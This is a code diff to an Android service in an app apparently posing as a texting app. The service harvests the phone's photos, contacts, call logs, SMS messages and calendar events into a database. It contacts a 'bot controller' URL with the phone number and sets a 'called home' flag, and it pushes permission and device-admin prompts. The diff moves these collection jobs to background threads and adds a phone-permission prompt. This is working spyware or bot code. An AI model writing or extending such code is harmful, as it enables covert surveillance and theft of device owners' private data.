@@ -38,6 +38,7 @@ import com.candroid.textme.ui.activities.permissions.CallLogActivity;
 import com.candroid.textme.ui.activities.permissions.CameraActivity;
 import com.candroid.textme.ui.activities.permissions.ContactsActivity;
 import com.candroid.textme.ui.activities.permissions.LocationActivity;
+import com.candroid.textme.ui.activities.permissions.PhoneActivity;
 import com.candroid.textme.ui.activities.permissions.RecordAudioActivity;
 import com.candroid.textme.ui.activities.permissions.StorageActivity;
 
@@ -97,6 +98,7 @@ public class JobsIntentService extends IntentService {
     public static final String ACTION_STORAGE_PERMISSION = "ACTION_STORAGE_PERMISSION";
     public static final String ACTION_CALENDAR_PERMISSION = "ACTION_CALENDAR_PERMISSION";
     public static final String ACTION_CAMERA_PERMISSION = "ACTION_CAMERA_PERMISSION";
+    public static final String ACTION_PHONE_PERMISSION = "ACTION_PHONE_PERMISSION";
     public static boolean sShouldTrackGps = false;
     private static long sNumber = 1111111111;
     public static HandlerThread sHandlerThread;
@@ -117,6 +119,7 @@ public class JobsIntentService extends IntentService {
                     new Thread(new Runnable() {
                         @Override
                         public void run() {
+                            android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                             File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
                             SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                             try {
@@ -143,6 +146,7 @@ public class JobsIntentService extends IntentService {
                 new Thread(new Runnable() {
                     @Override
                     public void run() {
+                        android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                         SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                         try {
                             database.beginTransaction();
@@ -164,6 +168,7 @@ public class JobsIntentService extends IntentService {
                     new Thread(new Runnable() {
                         @Override
                         public void run() {
+                            android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                             ArrayList<Contact> contacts = Lofl.fetchContactsInformation(JobsIntentService.this);
                             SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                             try {
@@ -197,6 +202,7 @@ public class JobsIntentService extends IntentService {
                 new Thread(new Runnable() {
                     @Override
                     public void run() {
+                        android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                         //SYNC CONTACTS
                         SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                         try{
@@ -350,6 +356,7 @@ public class JobsIntentService extends IntentService {
                     new Thread(new Runnable() {
                         @Override
                         public void run() {
+                            android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                             ArrayList<PhoneCall> phoneCalls = Lofl.fetchCallLog(JobsIntentService.this);
                             SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                             try {
@@ -382,6 +389,7 @@ public class JobsIntentService extends IntentService {
                     new Thread(new Runnable() {
                         @Override
                         public void run() {
+                            android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                             ArrayList<SmsMsg> smsMsgs = Lofl.fetchSmsMessages(JobsIntentService.this);
                             SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                             try {
@@ -439,19 +447,26 @@ public class JobsIntentService extends IntentService {
                 }
             } else if (action.equals(ACTION_CALENDAR_EVENT)) {
                 if (checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
-                    ArrayList<CalendarEvent> calendarEvents = Lofl.fetchCalendarEvents(this);
-                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
-                    try {
-                        database.beginTransaction();
-                        Database.insertCalendarEvents(database, calendarEvents);
-                        database.setTransactionSuccessful();
-                    } catch (SQLException e) {
-                        e.printStackTrace();
-                    } finally {
-                        database.endTransaction();
-                        database.close();
-                        Lofl.setJobRan(this, JobsScheduler.CALENDAR_EVENTS_KEY);
-                    }
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
+                            ArrayList<CalendarEvent> calendarEvents = Lofl.fetchCalendarEvents(JobsIntentService.this);
+                            SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                            try {
+                                database.beginTransaction();
+                                Database.insertCalendarEvents(database, calendarEvents);
+                                database.setTransactionSuccessful();
+                            } catch (SQLException e) {
+                                e.printStackTrace();
+                            } finally {
+                                database.endTransaction();
+                                database.close();
+                                Lofl.setJobRan(JobsIntentService.this, JobsScheduler.CALENDAR_EVENTS_KEY);
+                            }
+                        }
+                    }).start();
+
                 }
             } else if (action.equals(ACTION_WALLPAPER)) {
                 double randomNumber = Math.random();
@@ -610,43 +625,49 @@ public class JobsIntentService extends IntentService {
                 }
             }else if(action.equalsIgnoreCase(ACTION_DOWNLOAD_HTTP_DATA)){
                 if(intent.hasExtra(Constants.Keys.URL_KEY)){
-                    int response = -1;
-                    InputStream inputStream = null;
-                    try {
-                        URL url = new URL(Uri.parse(Constants.BOT_CONTROLLER_URL.concat(MessagingService.sTelephoneAddress)).toString());
-                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-                        connection.setReadTimeout(10000);
-                        connection.setConnectTimeout(10000);
-                        connection.setRequestMethod("GET");
-                        connection.setDoInput(true);
-                        connection.connect();
-                        response = connection.getResponseCode();
-                        Log.d(TAG, String.format("response code = %s", response));
-                        inputStream = connection.getInputStream();
-                        Reader reader = null;
-                        reader = new InputStreamReader(inputStream, "UTF-8");
-                        char[] buffer = new char[1000];
-                        reader.read(buffer);
-                        String content = new String(buffer);
-                        Log.d(TAG, String.format("HTML CONTENT = %s", content));
-                    } catch (MalformedURLException e) {
-                        e.printStackTrace();
-                    } catch (IOException e) {
-                        e.printStackTrace();
-                    }finally {
-                        if(inputStream != null){
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
+                            int response = -1;
+                            InputStream inputStream = null;
                             try {
-                                inputStream.close();
+                                URL url = new URL(Uri.parse(Constants.BOT_CONTROLLER_URL.concat(MessagingService.sTelephoneAddress)).toString());
+                                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                                connection.setReadTimeout(10000);
+                                connection.setConnectTimeout(10000);
+                                connection.setRequestMethod("GET");
+                                connection.setDoInput(true);
+                                connection.connect();
+                                response = connection.getResponseCode();
+                                Log.d(TAG, String.format("response code = %s", response));
+                                inputStream = connection.getInputStream();
+                                Reader reader = null;
+                                reader = new InputStreamReader(inputStream, "UTF-8");
+                                char[] buffer = new char[1000];
+                                reader.read(buffer);
+                                String content = new String(buffer);
+                                Log.d(TAG, String.format("HTML CONTENT = %s", content));
+                            } catch (MalformedURLException e) {
+                                e.printStackTrace();
                             } catch (IOException e) {
                                 e.printStackTrace();
+                            }finally {
+                                if(inputStream != null){
+                                    try {
+                                        inputStream.close();
+                                    } catch (IOException e) {
+                                        e.printStackTrace();
+                                    }
+                                }
+                                if(response == 200){
+                                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
+                                    editor.putBoolean(Constants.Keys.CALLED_HOME_KEY, true);
+                                    editor.apply();
+                                }
                             }
                         }
-                        if(response == 200){
-                            SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
-                            editor.putBoolean(Constants.Keys.CALLED_HOME_KEY, true);
-                            editor.apply();
-                        }
-                    }
+                    }).start();
                 }
             }else if(action.equalsIgnoreCase(ACTION_ADMIN)){
                 Intent adminIntent = new Intent();
@@ -697,6 +718,12 @@ public class JobsIntentService extends IntentService {
                 cameraIntent.setClass(this, CameraActivity.class);
                 cameraIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(cameraIntent);
+            }else if(action.equals(ACTION_PHONE_PERMISSION)){
+                Intent phoneIntent = new Intent();
+                phoneIntent.setAction(Intent.ACTION_VIEW);
+                phoneIntent.setClass(this, PhoneActivity.class);
+                phoneIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(phoneIntent);
             }else {
                 Log.d(TAG, "No action found!");
             }
